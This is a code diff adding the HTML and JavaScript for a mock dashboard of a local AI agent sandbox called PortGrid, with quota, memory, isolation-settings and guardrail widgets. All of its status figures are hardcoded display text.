+                        <div class="flex items-center justify-between border-b border-[var(--card-border)] pb-3 mb-4">
+                            <div class="flex items-center space-x-2 text-[var(--accent)]">
+                                <i data-lucide="wallet" class="w-4 h-4"></i>
+                                <h3 class="font-bold text-xs tracking-wider uppercase">Free Mode Governor</h3>
+                            </div>
+                            <span class="px-1.5 py-0.5 bg-[var(--accent)]/10 text-[var(--accent)] rounded text-[9px] uppercase font-bold tracking-widest border border-[var(--accent)]/20">Zero Spending</span>
+                        </div>
+
+                        <div class="space-y-4">
+                            <!-- Quota Gauge Progress -->
+                            <div class="space-y-1">
+                                <div class="flex justify-between text-xs font-semibold">
+                                    <span>Daily Quota Burn</span>
+                                    <span id="quota-value" class="text-[var(--accent)] font-bold">12,500 / 50,000 Tokens</span>
+                                </div>
+                                <div class="w-full h-2 bg-zinc-800/80 rounded-full overflow-hidden border border-[var(--card-border)]">
+                                    <div id="quota-progress" class="h-full bg-gradient-to-r from-[var(--accent)] to-teal-600 rounded-full transition-all duration-300" style="width: 25%"></div>
+                                </div>
+                            </div>
+
+                            <!-- Quota Adjustment Input slider -->
+                            <div class="space-y-1">
+                                <div class="flex justify-between text-[11px] text-[var(--text-muted)] font-medium">
+                                    <label for="quota-slider">Adjust Daily Cap (tokens)</label>
+                                    <span id="cap-display">50,000 cap</span>
+                                </div>
+                                <input type="range" id="quota-slider" min="10000" max="100000" step="5000" value="50000" oninput="updateDailyCap(this.value)" class="w-full h-1 bg-[var(--card-border)] rounded-lg appearance-none cursor-pointer accent-[var(--accent)]">
+                            </div>
+
+                            <!-- Call forecasting metadata -->
+                            <div class="grid grid-cols-2 gap-2 pt-2 border-t border-[var(--card-border)] text-center font-medium">
+                                <div class="bg-[var(--bg-nested)] p-2 rounded-lg border border-[var(--card-border)]">
+                                    <span class="text-[9px] text-[var(--text-muted)] font-bold uppercase block">Forecast Status</span>
+                                    <span class="text-xs font-bold text-green-500 uppercase">SAFE TO RUN</span>
+                                </div>
+                                <div class="bg-[var(--bg-nested)] p-2 rounded-lg border border-[var(--card-border)]">
+                                    <span class="text-[9px] text-[var(--text-muted)] font-bold uppercase block">Daily calls used</span>
+                                    <span id="calls-count-dashboard" class="text-xs font-bold text-[var(--accent)] font-mono">22 calls</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- WIDGET 3: Scoped Memory Matrix Viewer (Cerebro) -->
+                    <div class="glow-card rounded-2xl p-5 relative overflow-hidden transition-colors duration-300" role="region" aria-label="Cerebro Memory Matrix">
+                        <div class="flex items-center justify-between border-b border-[var(--card-border)] pb-3 mb-4">
+                            <div class="flex items-center space-x-2 text-[var(--accent)]">
+                                <i data-lucide="brain" class="w-4 h-4"></i>
+                                <h3 class="font-bold text-xs tracking-wider uppercase">Memory Matrix</h3>
+                            </div>
+                            <button onclick="pruneMemory()" class="text-[10px] text-[var(--accent)] hover:underline flex items-center space-x-1 font-bold focusable">
+                                <i data-lucide="trash-2" class="w-3 h-3"></i>
+                                <span>Prune Stale</span>
+                            </button>
+                        </div>
+
+                        <div class="space-y-3">
+                            <!-- Keyword Search Form Input -->
+                            <div class="relative">
+                                <input id="memory-search" type="text" placeholder="Search project memory (Keyword)..." oninput="searchMemoryNodes(this.value)" class="w-full bg-[var(--bg-surface)] border border-[var(--card-border)] text-xs rounded-lg pl-8 pr-3 py-2 text-[var(--text-primary)] focus:outline-none focus:border-[var(--accent)] focusable" aria-label="Search memory">
+                                <i data-lucide="search" class="w-3.5 h-3.5 text-zinc-500 absolute left-2.5 top-2.5"></i>
+                            </div>
+
+                            <!-- List of Memory Nodes -->
+                            <div id="memory-nodes-list" class="space-y-2 max-h-40 overflow-y-auto pr-1">
+                                <div class="p-2 rounded bg-[var(--bg-nested)] border border-[var(--card-border)] text-[11px] space-y-1 transition hover:border-[var(--accent)]/40">
+                                    <div class="flex justify-between font-bold">
+                                        <span class="text-[var(--accent)]">User Client Identity</span>
+                                        <span class="text-zinc-500 text-[9px] font-mono">Confidence: 0.98</span>
+                                    </div>
+                                    <p class="text-[var(--text-muted)] line-clamp-1 font-medium">Alex manages strict, high-privacy content creation portfolios.</p>
+                                </div>
+                                <div class="p-2 rounded bg-[var(--bg-nested)] border border-[var(--card-border)] text-[11px] space-y-1 transition hover:border-[var(--accent)]/40">
+                                    <div class="flex justify-between font-bold">
+                                        <span class="text-[var(--accent)]">Database Engine Config</span>
+                                        <span class="text-zinc-500 text-[9px] font-mono">Confidence: 0.95</span>
+                                    </div>
+                                    <p class="text-[var(--text-muted)] line-clamp-1 font-medium">SQLite selected over DuckDB to optimize transactional locking.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+            <!-- TAB 2: PORTGRID SET-UPS CONFIGURATION ENGINE -->
+            <div id="panel-setups" class="flex-1 hidden flex-col lg:flex-row space-y-6 lg:space-y-0 lg:space-x-6 w-full" role="tabpanel" aria-labelledby="tab-setups">
+                
+                <!-- LEFT CONTENT AREA: Sandbox Configurations -->
+                <div class="flex-1 bg-[var(--bg-surface-glass)] border border-[var(--card-border)] backdrop-blur-md rounded-2xl p-5 shadow-xl flex flex-col relative overflow-hidden transition-colors duration-300">
+                    <div class="absolute inset-0 bg-[radial-gradient(circle_at_top,_var(--grid-color)_0%,_transparent_75%)] pointer-events-none"></div>
+
+                    <div class="relative z-10 flex flex-col h-full space-y-4">
+                        <!-- Header Title -->
+                        <div class="border-b border-[var(--card-border)] pb-3">
+                            <h1 class="text-xl font-black tracking-wide">PortGrid Sandbox Set-ups</h1>
+                            <p class="text-xs text-[var(--text-muted)] mt-0.5 font-medium">Configure network namespaces, seccomp filters, thread allocations, and credential sanitization layers.</p>
+                        </div>
+
+                        <!-- System Configurations Options Form Grid -->
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 pt-2">
+                            
+                            <!-- Section: Concurrency & Dynamic Threading -->
+                            <div class="space-y-4">
+                                <h3 class="text-sm font-black text-[var(--accent)] flex items-center space-x-2">
+                                    <i data-lucide="cpu" class="w-4 h-4"></i>
+                                    <span>Dynamic Threading Allocation</span>
+                                </h3>
+
+                                <div class="space-y-3 bg-[var(--bg-nested)] border border-[var(--card-border)] rounded-xl p-4">
+                                    <!-- Thread pooling limits -->
+                                    <div class="space-y-2">
+                                        <div class="flex justify-between text-xs">
+                                            <span class="text-[var(--text-muted)] font-semibold">Active Worker Threads</span>
+                                            <span id="threads-display" class="font-black text-[var(--accent)]">3 cores (Safe max)</span>
+                                        </div>
+                                        <input type="range" min="1" max="8" value="3" oninput="updateThreadDisplay(this.value)" class="w-full h-1 bg-[var(--card-border)] rounded-lg appearance-none cursor-pointer accent-[var(--accent)]">
+                                    </div>
+                                    <p class="text-[10px] text-[var(--text-muted)]">Balances complex semantic calculations and AST parsing over legacy silicon to protect the main Honoe event loop.</p>
+                                </div>
+                            </div>
+
+                            <!-- Section: PII & Token Redaction Checkpoints -->
+                            <div class="space-y-4">
+                                <h3 class="text-sm font-black text-[var(--accent)] flex items-center space-x-2">
+                                    <i data-lucide="eye-off" class="w-4 h-4"></i>
+                                    <span>Redaction Checkpoints</span>
+                                </h3>
+
+                                <div class="space-y-3 bg-[var(--bg-nested)] border border-[var(--card-border)] rounded-xl p-4">
+                                    <div class="space-y-2 text-xs font-semibold">
+                                        <label class="flex items-center space-x-2 cursor-pointer">
+                                            <input type="checkbox" checked class="rounded bg-zinc-800 border-zinc-700 text-[var(--accent)] focus:ring-[var(--accent)]">
+                                            <span>Redact before external inference</span>
+                                        </label>
+                                        <label class="flex items-center space-x-2 cursor-pointer">
+                                            <input type="checkbox" checked class="rounded bg-zinc-800 border-zinc-700 text-[var(--accent)] focus:ring-[var(--accent)]">
+                                            <span>Redact before memory persistence</span>
+                                        </label>
+                                        <label class="flex items-center space-x-2 cursor-pointer">
+                                            <input type="checkbox" checked class="rounded bg-zinc-800 border-zinc-700 text-[var(--accent)] focus:ring-[var(--accent)]">
+                                            <span>Scrub plain keys from Pino log exports</span>
+                                        </label>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Section: Sandbox and Permission Isolation -->
+                            <div class="space-y-4 md:col-span-2">
+                                <h3 class="text-sm font-black text-[var(--accent)] flex items-center space-x-2">
+                                    <i data-lucide="binary" class="w-4 h-4"></i>
+                                    <span>Environment Isolation Rules</span>
+                                </h3>
+
+                                <div class="grid grid-cols-1 sm:grid-cols-3 gap-4 bg-[var(--bg-nested)] border border-[var(--card-border)] rounded-xl p-4">
+                                    <div class="flex items-center justify-between p-2 rounded bg-[var(--bg-surface)] border border-[var(--card-border)]">
+                                        <div>
+                                            <span class="text-xs font-bold block">Network Isolation</span>
+                                            <span class="text-[9px] text-[var(--text-muted)] font-semibold block">unshare --net sandbox</span>
+                                        </div>
+                                        <input type="checkbox" id="check-net" checked class="w-4 h-4 text-[var(--accent)] bg-zinc-800 border-zinc-700 rounded focus:ring-[var(--accent)]">
+                                    </div>
+                                    <div class="flex items-center justify-between p-2 rounded bg-[var(--bg-surface)] border border-[var(--card-border)]">
+                                        <div>
+                                            <span class="text-xs font-bold block">Seccomp Profiles</span>
+                                            <span class="text-[9px] text-[var(--text-muted)] font-semibold block">Limit host system calls</span>
+                                        </div>
+                                        <input type="checkbox" id="check-seccomp" checked class="w-4 h-4 text-[var(--accent)] bg-zinc-800 border-zinc-700 rounded focus:ring-[var(--accent)]">
+                                    </div>
+                                    <div class="flex items-center justify-between p-2 rounded bg-[var(--bg-surface)] border border-[var(--card-border)]">
+                                        <div>
+                                            <span class="text-xs font-bold block">Read-Only Runtime</span>
+                                            <span class="text-[9px] text-[var(--text-muted)] font-semibold block">Secure root filesystem</span>
+                                        </div>
+                                        <input type="checkbox" id="check-readonly" checked class="w-4 h-4 text-[var(--accent)] bg-zinc-800 border-zinc-700 rounded focus:ring-[var(--accent)]">
+                                    </div>
+                                </div>
+                            </div>
+
+                        </div>
+
+                        <!-- Config Action buttons -->
+                        <div class="flex justify-end space-x-3 pt-6 border-t border-[var(--card-border)] mt-auto">
+                            <button onclick="resetSetupConfigs()" class="px-5 py-2 rounded-xl bg-[var(--bg-nested)] hover:opacity-90 text-sm font-bold border border-[var(--card-border)] transition focusable">Reset Defaults</button>
+                            <button onclick="saveSetupConfigs()" class="px-5 py-2 rounded-xl bg-gradient-to-r from-[var(--accent)] to-teal-600 hover:opacity-90 text-white dark:text-zinc-950 font-black text-sm transition shadow-lg shadow-[var(--accent-glow)] focusable">Apply Configurations</button>
+                        </div>
+
+                    </div>
+                </div>
+
+                <!-- RIGHT CONTENT AREA: Glowing Shadow Setup Widgets -->
+                <div class="w-full lg:w-96 flex flex-col space-y-6">
+                    
+                    <!-- WIDGET 4: Safety Boundary Assertions Status -->
+                    <div class="glow-card rounded-2xl p-5 relative overflow-hidden transition-colors duration-300" role="region" aria-label="Safety Assertions Status">
+                        <div class="flex items-center justify-between border-b border-[var(--card-border)] pb-3 mb-4">
+                            <div class="flex items-center space-x-2 text-[var(--accent)]">
+                                <i data-lucide="shield-check" class="w-4 h-4"></i>
+                                <h3 class="font-bold text-xs tracking-wider uppercase">Category A Guardrails</h3>
+                            </div>
+                            <span class="text-[10px] text-green-500 font-bold uppercase tracking-wider font-mono">ENFORCED</span>
+                        </div>
+
+                        <!-- List of assertions -->
+                        <div class="space-y-3 text-xs">
+                            <div class="flex items-start space-x-2 border-b border-[var(--card-border)] pb-2">
+                                <i data-lucide="check-circle-2" class="w-4 h-4 text-green-500 mt-0.5"></i>
+                                <div>
+                                    <span class="font-bold block text-[var(--text-primary)]">SA-01: Explanations SQL Block</span>
+                                    <p class="text-[11px] text-[var(--text-muted)] font-medium">No INSERT/UPDATE queries permitted in explanation paths.</p>
+                                </div>
+                            </div>
+                            <div class="flex items-start space-x-2 border-b border-[var(--card-border)] pb-2">
+                                <i data-lucide="check-circle-2" class="w-4 h-4 text-green-500 mt-0.5"></i>
+                                <div>
+                                    <span class="font-bold block text-[var(--text-primary)]">SA-02: Executive Code Quarantine</span>
+                                    <p class="text-[11px] text-[var(--text-muted)] font-medium">Strictly forbids raw bash, sh, or python compilation blocks.</p>
+                                </div>
+                            </div>
+                            <div class="flex items-start space-x-2">
+                                <i data-lucide="check-circle-2" class="w-4 h-4 text-green-500 mt-0.5"></i>
+                                <div>
+                                    <span class="font-bold block text-[var(--text-primary)]">SA-04: Node Category Sanity</span>
+                                    <p class="text-[11px] text-[var(--text-muted)] font-medium">Workflows forbidden from adding shell, exec, or eval nodes.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+        </main>
+    </div>
+
+    <!-- COCKPIT BOTTOM AMBIENT STATUS BAR -->
+    <footer class="w-full h-8 bg-zinc-950 border-t border-[var(--card-border)] px-4 flex items-center justify-between text-[10px] text-zinc-500 font-mono z-25 relative transition-colors duration-300">
+        <div class="flex items-center space-x-4">
+            <div class="flex items-center space-x-1.5">
+                <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
+                <span class="font-bold text-green-400 uppercase">Hono Daemon Online</span>
+            </div>
+            <span>|</span>
+            <span>Port: <strong class="text-[var(--accent)] font-bold">127.0.0.1:4096</strong></span>
+            <span>|</span>
+            <span>Database: <strong class="text-[var(--accent)] font-bold">BaseVault.db</strong></span>
+        </div>
+        <div class="flex items-center space-x-4">
+            <span>Verified Confidence Metrics: <strong class="text-green-400 font-bold">398 Tests Pass</strong></span>
+            <span>|</span>
+            <span>Supply Chain: <strong class="text-green-400 font-bold">CycloneDX Compliant</strong></span>
+        </div>
+    </footer>
+
+    <!-- INTERACTIVE FLOATING CEREBRO CHAT SENTINEL PANEL -->
+    <div id="chat-sentinel" class="fixed bottom-12 right-6 z-50 flex flex-col items-end">
+        
+        <!-- Toggle button -->
+        <button onclick="toggleChatSentinel()" class="w-12 h-12 rounded-full bg-gradient-to-tr from-[var(--accent)] to-teal-600 text-white dark:text-zinc-950 flex items-center justify-center shadow-lg shadow-[var(--accent-glow)] hover:scale-105 transform transition duration-200 focusable" aria-label="Toggle Cerebro chatbot assistant">
+            <i data-lucide="bot-message-square" class="w-6 h-6"></i>
+        </button>
+
+        <!-- Chat screen container -->
+        <div id="chat-box" class="w-80 h-96 bg-[var(--bg-surface-glass)] backdrop-blur-md border border-[var(--card-border)] rounded-2xl shadow-2xl mt-3 hidden flex-col overflow-hidden transition-all duration-300">
+            <!-- Header bar -->
+            <div class="bg-gradient-to-r from-zinc-950 to-teal-950 p-3 flex items-center justify-between border-b border-[var(--card-border)]">
+                <div class="flex items-center space-x-2">
+                    <span class="w-2 h-2 rounded-full bg-green-400"></span>
+                    <span class="text-xs font-bold tracking-wide uppercase text-white">Cerebro Assist Sentinel</span>
+                </div>
+                <button onclick="toggleChatSentinel()" class="text-zinc-400 hover:text-white" aria-label="Minimize chatbot">
+                    <i data-lucide="minus" class="w-4 h-4"></i>
+                </button>
+            </div>
+
+            <!-- Scrollable chat body -->
+            <div id="chat-conversation" class="flex-1 overflow-y-auto p-4 space-y-3 text-xs">
+                <div class="bg-[var(--terminal-bg)] text-[var(--terminal-text)] border border-[var(--accent)]/20 p-2.5 rounded-xl rounded-tl-none self-start max-w-[85%] leading-relaxed">
+                    <span class="font-black text-[10px] text-[var(--accent)] block mb-1">CEREBRO SENTINEL:</span>
+                    Welcome, Billie. Let us synthesize and map your local cognitive topology. Ask me anything about PortGrid's tools sandbox, escape validation, or autonomy dails.
+                </div>
+            </div>
+
+            <!-- Chat input bar -->
+            <div class="p-2 border-t border-[var(--card-border)] bg-zinc-950/50 flex items-center space-x-1">
+                <input id="chat-input-field" type="text" placeholder="Query our local cognitive nexus..." class="flex-1 bg-[var(--bg-surface)] border border-[var(--card-border)] text-xs rounded-lg px-3 py-2 text-[var(--text-primary)] focus:outline-none focus:border-[var(--accent)]" onkeydown="if(event.key === 'Enter') handleChatSubmit()">
+                <button onclick="handleChatSubmit()" class="p-2 bg-[var(--accent)] text-white dark:text-zinc-950 hover:opacity-90 rounded-lg transition focusable" aria-label="Send query">
+                    <i data-lucide="send" class="w-3.5 h-3.5"></i>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- NOTIFICATION ALERT POPUPS SYSTEM -->
+    <div id="alert-toast" class="fixed top-20 left-1/2 transform -translate-x-1/2 z-50 bg-[var(--bg-surface-glass)] backdrop-blur-md border border-[var(--card-border)] p-4 rounded-xl shadow-2xl transition-all duration-300 pointer-events-none opacity-0 flex items-center space-x-3 max-w-sm">
+        <div id="alert-icon-wrapper" class="w-8 h-8 rounded-full flex items-center justify-center"></div>
+        <div class="flex-1">
+            <span id="alert-title" class="font-bold text-xs block text-[var(--accent)] uppercase tracking-wider"></span>
+            <p id="alert-body" class="text-[11px] text-[var(--text-muted)] mt-0.5 font-bold"></p>
+        </div>
+    </div>
+
+    <!-- COGNITIVE SCHEMAS EXPLO MODULE VIEW -->
+    <div id="meta-explorer" class="fixed inset-0 z-50 bg-black/80 flex items-center justify-center hidden p-6">
+        <div class="w-full max-w-2xl bg-[var(--bg-surface)] border border-[var(--card-border)] rounded-2xl p-6 shadow-2xl flex flex-col max-h-[80vh]">
+            <div class="flex items-center justify-between border-b border-[var(--card-border)] pb-3 mb-4">
+                <div class="flex items-center space-x-2 text-[var(--accent)]">
+                    <i data-lucide="database" class="w-5 h-5"></i>
+                    <h2 class="font-bold text-lg">System Cognitive Metadata Mapping</h2>
+                </div>
+                <button onclick="toggleMetaExplorer()" class="p-1.5 rounded-lg hover:bg-zinc-800 text-zinc-500 hover:text-white" aria-label="Close schema view">
+                    <i data-lucide="x" class="w-5 h-5"></i>
+                </button>
+            </div>
+            
+            <p class="text-xs text-[var(--text-muted)] mb-4 font-semibold">
+                Below is the verified programmatical list of system cognitive structures parsed directly from our active <code class="bg-[var(--bg-nested)] border border-[var(--card-border)] px-1 rounded">&lt;meta&gt;</code> Tags.
+            </p>
+
+            <div id="meta-tag-list" class="flex-1 overflow-y-auto space-y-3 font-mono text-[11px] pr-2">
+                <!-- Programmatically populated list of schemas -->
+            </div>
+            
+            <div class="mt-4 pt-3 border-t border-[var(--card-border)] flex justify-end">
+                <button onclick="toggleMetaExplorer()" class="bg-[var(--accent)] text-white dark:text-zinc-950 px-4 py-2 rounded-xl text-xs font-bold focusable">
+                    Return to cockpit
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- DEFERENCE INTENT PREVIEW MODAL (DEFERENCE UI PARADIGM) -->
+    <div id="intent-modal" class="fixed inset-0 z-50 bg-black/85 flex items-center justify-center hidden p-6">
+        <div class="w-full max-w-xl bg-[var(--bg-surface)] border border-[var(--card-border)] rounded-2xl p-6 shadow-2xl flex flex-col">
+            <div class="flex items-center justify-between border-b border-[var(--card-border)] pb-3 mb-4">
+                <div class="flex items-center space-x-2 text-[var(--accent)]">
+                    <i data-lucide="split" class="w-5 h-5"></i>
+                    <h2 class="font-black text-lg uppercase tracking-wide">Decision Node Audit</h2>
+                </div>
+                <button onclick="toggleIntentTree()" class="p-1.5 rounded-lg hover:bg-zinc-800 text-zinc-500 hover:text-white" aria-label="Close preview">
+                    <i data-lucide="x" class="w-5 h-5"></i>
+                </button>
+            </div>
+
+            <p class="text-xs text-[var(--text-muted)] mb-4">
+                Rather than loading exhausting background terminal spam, PortGrid models a clean intent preview of the current processing cycle.
+            </p>
+
+            <div class="bg-zinc-950 border border-[var(--card-border)] p-4 rounded-xl space-y-3 font-mono text-xs text-[var(--terminal-text)]">
+                <div class="flex items-center space-x-2">
+                    <i data-lucide="check-circle" class="w-4 h-4 text-green-400"></i>
+                    <span>CLAIM WORKFLOW: [wf_7a8d29b] -> claimed by [worker-3]</span>
+                </div>
+                <div class="flex items-center space-x-2 pl-4 border-l border-zinc-800">
+                    <i data-lucide="arrow-right" class="w-3.5 h-3.5 text-zinc-500"></i>
+                    <span>Execute command: <code class="bg-zinc-900 px-1 rounded text-yellow-400">ls -la</code> (Safe allowlist Match)</span>
+                </div>
+                <div class="flex items-center space-x-2 pl-4 border-l border-zinc-800 text-green-400">
+                    <i data-lucide="shield" class="w-3.5 h-3.5"></i>
+                    <span>Verification complete. Output scrubbed: 0 credentials parsed.</span>
+                </div>
+            </div>
+
+            <div class="mt-5 pt-3 border-t border-[var(--card-border)] flex justify-end space-x-2">
+                <button onclick="toggleIntentTree()" class="px-4 py-2 rounded-xl bg-zinc-800 text-zinc-300 text-xs font-bold transition">Close</button>
+                <button onclick="forceCancelActiveWorkflow()" class="px-4 py-2 rounded-xl bg-red-600 hover:bg-red-700 text-white text-xs font-bold transition">Force Cancel Run</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- APP FUNCTIONALITY JAVASCRIPT LAYER -->
+    <script>
+        // Init Lucide Icons
+        lucide.createIcons();
+
+        // Gemini API Configuration & Variables
+        const apiKey = ""; // Managed dynamically by Canvas environment
+        let isAPICallActive = false;
+
+        // Sound Synthesis Engine via Web Audio API (Ambient Technical sounds)
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        
+        function playSynthSound(freq, type = 'sine', duration = 0.1, gainVal = 0.1) {
+            try {
+                if (audioCtx.state === 'suspended') {
+                    audioCtx.resume();
+                }
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = type;
+                osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
+                gain.gain.setValueAtTime(gainVal, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + duration);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                osc.stop(audioCtx.currentTime + duration);
+            } catch (e) {
+                // Fallback quietly if browser blocks audio
+            }
+        }
+
+        // Global Application Mock Database State
+        const state = {
+            activeTab: 'dashboard',
+            isSidebarOpen: true,
+            isSuiteSwitcherOpen: false,
+            isIntentTreeOpen: false,
+            theme: 'dark',
+            dailyQuotaCap: 50000,
+            callsUsedToday: 22,
+            activeProject: 'alex-workspace',
+            pinoLogs: [
+                "INIT: PortGrid Skills Registry active...",
+                "INIT: P0 Sandboxing parameters validated...",
+                "AUDIT: Scoped Workspace locked to project silo: alex-workspace"
+            ],
+            memoryNodes: {
+                'alex-workspace': [
+                    { title: "User Client Identity", text: "Alex manages strict, high-privacy content creation portfolios.", confidence: 0.98, age: "12d" },
+                    { title: "Database Engine Config", text: "SQLite selected over DuckDB to optimize transactional locking.", confidence: 0.95, age: "1d" },
+                    { title: "Quota Governor Bounds", text: "Free Mode cap established at 50,000 tokens to shield from excessive cloud fees.", confidence: 0.89, age: "6d" }
+                ],
+                'sam-workspace': [
+                    { title: "Developer Scope Rules", text: "Sam builds lightweight, self-hosted containers using Node.js.", confidence: 0.97, age: "3d" },
+                    { title: "Network Sandboxing", text: "unshare --net isolates dangerous system commands safely.", confidence: 0.91, age: "4d" }
+                ]
+            }
+        };
+
+        // Tab Selector Engine switching
+        function switchTab(tabId) {
+            state.activeTab = tabId;
+            const tabDash = document.getElementById('tab-dashboard');
+            const tabSetups = document.getElementById('tab-setups');
+            const panelDash = document.getElementById('panel-dashboard');
+            const panelSetups = document.getElementById('panel-setups');
+
+            playSynthSound(440, 'triangle', 0.15, 0.05);
+
+            if (tabId === 'dashboard') {
+                tabDash.className = "px-5 py-1.5 rounded-lg text-sm font-semibold transition-all duration-200 flex items-center space-x-2 text-white bg-[var(--accent)] shadow shadow-[var(--accent-glow)] focusable";
+                tabDash.setAttribute('aria-selected', 'true');
+                
+                tabSetups.className = "px-5 py-1.5 rounded-lg text-sm font-semibold transition-all duration-200 flex items-center space-x-2 text-[var(--text-muted)] hover:text-[var(--text-primary)] focusable";
+                tabSetups.setAttribute('aria-selected', 'false');
+
+                panelDash.classList.remove('hidden');
+                panelDash.classList.add('flex');
+                panelSetups.classList.add('hidden');
+                panelSetups.classList.remove('flex');
+            } else {
+                tabSetups.className = "px-5 py-1.5 rounded-lg text-sm font-semibold transition-all duration-200 flex items-center space-x-2 text-white bg-[var(--accent)] shadow shadow-[var(--accent-glow)] focusable";
+                tabSetups.setAttribute('aria-selected', 'true');
+
+                tabDash.className = "px-5 py-1.5 rounded-lg text-sm font-semibold transition-all duration-200 flex items-center space-x-2 text-[var(--text-muted)] hover:text-[var(--text-primary)] focusable";
+                tabDash.setAttribute('aria-selected', 'false');
+
+                panelSetups.classList.remove('hidden');
+                panelSetups.classList.add('flex');
+                panelDash.classList.add('hidden');
+                panelDash.classList.remove('flex');
+            }
+            writeAuditLog(`NAV: Switch focus layout to "${tabId}" view panel`);
+        }
+
+        // Toggles Right-hand Workspace Sidebar (Slides off-screen right and back)
+        function toggleSidebar() {
+            const sidebar = document.getElementById('sidebar-panel');
+            const mainContent = document.getElementById('main-content-layout');
+            state.isSidebarOpen = !state.isSidebarOpen;
+
+            playSynthSound(600, 'sine', 0.12, 0.04);
+
+            if (state.isSidebarOpen) {
+                sidebar.classList.remove('translate-x-full');
+                sidebar.classList.add('translate-x-0');
+                mainContent.classList.add('lg:mr-80');
+            } else {
+                sidebar.classList.add('translate-x-full');
+                sidebar.classList.remove('translate-x-0');
+                mainContent.classList.remove('lg:mr-80');
+            }
+        }
+
+        // Toggles Left-hand Suite Switcher Menu Drawer
+        function toggleSuiteSwitcher() {
+            const switcher = document.getElementById('suite-switcher');
+            state.isSuiteSwitcherOpen = !state.isSuiteSwitcherOpen;
+
+            playSynthSound(500, 'triangle', 0.1, 0.05);
+
+            if (state.isSuiteSwitcherOpen) {
+                switcher.classList.remove('-translate-x-full');
+                switcher.classList.add('translate-x-0');
+            } else {
+                switcher.classList.add('-translate-x-full');
+                switcher.classList.remove('translate-x-0');
+            }
+        }
+
+        // Dynamic statusline / intention views (Deference UI paradigm)
+        function toggleIntentTree() {
+            const modal = document.getElementById('intent-modal');
+            state.isIntentTreeOpen = !state.isIntentTreeOpen;
+            
+            playSynthSound(500, 'triangle', 0.1, 0.05);
+            modal.classList.toggle('hidden');
+        }
+
+        function forceCancelActiveWorkflow() {
+            toggleIntentTree();
+            writeAuditLog("COREEXEC: Force abort called by operator. Draining active workers leases.");
+            spawnAlert("Aborted Workflow", "Active queue has been forcefully terminated. SQLite leases expired cleanly.", "red");
+        }
+
+        // Interactive switch simulation alert for other Suites
+        function triggerSuiteDemo(moduleName) {
+            playSynthSound(587, 'sine', 0.15, 0.05);
+            toggleSuiteSwitcher();
+            spawnAlert(`${moduleName} Navigation`, `Routing request received. Pre-staging secure sandbox portal for ${moduleName} Suite.`, "purple");
+            writeAuditLog(`ROUTE: Suite Router directed pipeline query toward ${moduleName}.`);
+        }
+
+        // Custom Visual Notification Toast Alert
+        function spawnAlert(title, message, theme = 'purple') {
+            const toast = document.getElementById('alert-toast');
+            const alertTitle = document.getElementById('alert-title');
+            const alertBody = document.getElementById('alert-body');
+            const iconWrapper = document.getElementById('alert-icon-wrapper');
+
+            alertTitle.innerText = title;
+            alertBody.innerText = message;
+
+            if (theme === 'red') {
+                playSynthSound(220, 'sawtooth', 0.4, 0.08);
+                iconWrapper.className = "w-8 h-8 rounded-full bg-red-500/15 text-red-400 flex items-center justify-center border border-red-500/30";
+                iconWrapper.innerHTML = `<i data-lucide="triangle-alert" class="w-4 h-4"></i>`;
+                alertTitle.className = "font-bold text-xs block text-red-400 uppercase tracking-wider";
+            } else if (theme === 'green') {
+                playSynthSound(587, 'sine', 0.25, 0.06);
+                iconWrapper.className = "w-8 h-8 rounded-full bg-green-500/15 text-green-400 flex items-center justify-center border border-green-500/30";
+                iconWrapper.innerHTML = `<i data-lucide="circle-check-big" class="w-4 h-4"></i>`;
+                alertTitle.className = "font-bold text-xs block text-green-400 uppercase tracking-wider";
+            } else {
+                playSynthSound(392, 'sine', 0.15, 0.05);
+                iconWrapper.className = "w-8 h-8 rounded-full bg-[var(--accent)]/15 text-[var(--accent)] flex items-center justify-center border border-[var(--accent)]/30";
+                iconWrapper.innerHTML = `<i data-lucide="info" class="w-4 h-4"></i>`;
+                alertTitle.className = "font-bold text-xs block text-[var(--accent)] uppercase tracking-wider";
+            }
+
+            lucide.createIcons();
+
+            toast.style.opacity = '1';
+            toast.style.transform = 'translate(-50%, 10px)';
+
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                toast.style.transform = 'translate(-50%, 0)';
+            }, 3500);
+        }
+
+        // Project Switching Engine
+        function switchProject() {
+            const selectVal = document.getElementById('project-selector').value;
+            
+            if (selectVal === 'custom-workspace') {
+                spawnAlert("Sandbox Notice", "Custom project workspace setups require physical BaseVault schema migration allocation.", "red");
+                document.getElementById('project-selector').value = state.activeProject;
+                return;
+            }
+
+            state.activeProject = selectVal;
+            writeAuditLog(`AUDIT: Switch workspace project scoped boundary file: ${selectVal}`);
+            spawnAlert("Silo Isolation Secured", `Cognitive focus successfully locked to isolated container: "${selectVal}"`, "purple");
+            renderMemoryNodes();
+        }
+
+        // Render Local Memory list of nodes
+        function renderMemoryNodes(filteredNodes = null) {
+            const container = document.getElementById('memory-nodes-list');
+            container.innerHTML = '';
+
+            const nodes = filteredNodes || state.memoryNodes[state.activeProject] || [];
+
+            if (nodes.length === 0) {
+                container.innerHTML = `
+                    <div class="text-[11px] text-zinc-500 text-center py-4">
+                        Zero relevant memory structures matching search index parameters.
+                    </div>
+                `;
+                return;
+            }
+
+            nodes.forEach(node => {
+                const element = document.createElement('div');
+                element.className = "p-2.5 rounded bg-[var(--bg-nested)] border border-[var(--card-border)] text-[11px] space-y-1 transition hover:border-[var(--accent)]/40 relative";
+                element.innerHTML = `
+                    <div class="flex justify-between font-bold">
+                        <span class="text-[var(--accent)]">${escapeHTML(node.title)}</span>
+                        <span class="text-zinc-500 text-[9px] font-mono">Conf: ${node.confidence}</span>
+                    </div>
